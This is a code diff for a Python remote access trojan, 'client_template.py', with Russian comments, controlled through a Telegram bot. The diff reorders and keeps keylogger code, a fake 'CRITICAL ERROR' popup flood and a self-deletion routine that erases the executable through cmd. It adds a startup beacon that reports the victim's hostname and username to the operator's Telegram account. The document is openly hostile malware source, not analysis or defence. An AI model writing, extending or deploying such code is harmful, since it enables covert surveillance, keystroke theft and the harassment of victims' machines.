@@ -1,4 +1,3 @@
-# client_template.py
 import os
 import sys
 import time
@@ -7,8 +6,6 @@ import platform
 import subprocess
 import threading
 import tempfile
-import shutil
-import ctypes
 from datetime import datetime
 
 import telebot
@@ -52,7 +49,7 @@ def take_screenshot():
     except Exception as e:
         return None
 
-# --- КЕЙЛОГГЕР (упрощённый) ---
+# --- КЕЙЛОГГЕР ---
 keylog_buffer = ""
 keylog_active = False
 
@@ -80,6 +77,25 @@ def stop_keylogger():
     global keylog_active
     keylog_active = False
     return keylog_buffer
+
+# --- GDI ВЗРЫВ (заглушка) ---
+def gdi_explosion():
+    for _ in range(50):
+        try:
+            import ctypes
+            ctypes.windll.user32.MessageBoxW(0, "CRITICAL ERROR", "System", 0x10)
+        except:
+            pass
+        time.sleep(0.05)
+
+# --- САМОУНИЧТОЖЕНИЕ ---
+def self_destruct():
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"', shell=True)
+        sys.exit(0)
+    except:
+        sys.exit(0)
 
 # --- КОМАНДЫ БОТА ---
 @bot.message_handler(commands=['start'])
@@ -126,25 +142,16 @@ def cmd_handler(message):
         bot.reply_to(message, "💥 Удаляю себя...")
         self_destruct()
 
-# --- GDI ВЗРЫВ (заглушка, полная версия в Волне 3) ---
-def gdi_explosion():
-    # Полный код будет в Волне 3
-    for _ in range(50):
-        ctypes.windll.user32.MessageBoxW(0, "CRITICAL ERROR", "System", 0x10)
-        time.sleep(0.05)
-
-# --- САМОУНИЧТОЖЕНИЕ ---
-def self_destruct():
-    try:
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
-        # Удаляем себя после выхода
-        subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"', shell=True)
-        sys.exit(0)
-    except:
-        sys.exit(0)
-
 if __name__ == "__main__":
     try:
+        bot.send_message(
+            ADMIN_ID, 
+            f"🪱 *Клиент запущен!*\n"
+            f"🖥 Хост: `{socket.gethostname()}`\n"
+            f"👤 Юзер: `{os.getlogin()}`\n"
+            f"🕒 {datetime.now().strftime('%H:%M:%S')}", 
+            parse_mode="Markdown"
+        )
         bot.infinity_polling(timeout=10, long_polling_timeout=5)
     except Exception:
         time.sleep(10)
